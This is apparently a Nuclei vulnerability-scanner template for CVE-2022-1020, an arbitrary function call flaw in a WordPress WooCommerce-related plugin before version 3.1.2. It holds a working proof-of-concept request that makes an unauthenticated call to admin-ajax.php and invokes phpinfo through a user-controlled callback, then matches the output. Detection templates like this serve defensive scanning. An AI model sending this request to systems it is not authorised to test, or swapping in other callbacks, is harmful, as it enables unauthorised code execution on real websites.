id: CVE-2022-1020
info:
  name: WordPress WooCommerce <3.1.2 - Arbitrary Function Call
  author: Akincibor
  severity: critical
  description: The WordPress WooCommerce plugin before version 3.1.2 is vulnerable
    to an Arbitrary Function Call attack, which allows unauthenticated attackers to
    call arbitrary functions using a user-controlled argument without proper authorisation
    or CSRF checks.
  reference:
  - https://wpscan.com/vulnerability/04fe89b3-8ad1-482f-a96d-759d1d3a0dd5
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1020
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1020
    cwe-id: CWE-352,CWE-862
  tags: wpscan,wp,wp-plugin,wordpress,cve,cve2022,unauth
  metadata:
    impact: The security vulnerability in the WordPress WooCommerce plugin before
      version 3.1.2 could allow unauthenticated attackers to call arbitrary functions,
      leading to potential data compromise, system manipulation, and additional cyber
      attacks.
    recommendation: It is recommended to update your WordPress WooCommerce plugin
      to version 3.1.2 or higher to prevent exploitation of the CVE-2022-1020 vulnerability.
requests:
- raw:
  - 'POST /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    option_key=a&perpose=update&callback=phpinfo

    '
  matchers-condition: and
  matchers:
  - type: word
    words:
    - PHP Extension
    - PHP Version
    condition: and
  - type: status
    status:
    - 200
  extractors:
  - type: regex
    part: body
    group: 1
    regex:
    - '>PHP Version <\/td><td class="v">([0-9.]+)'
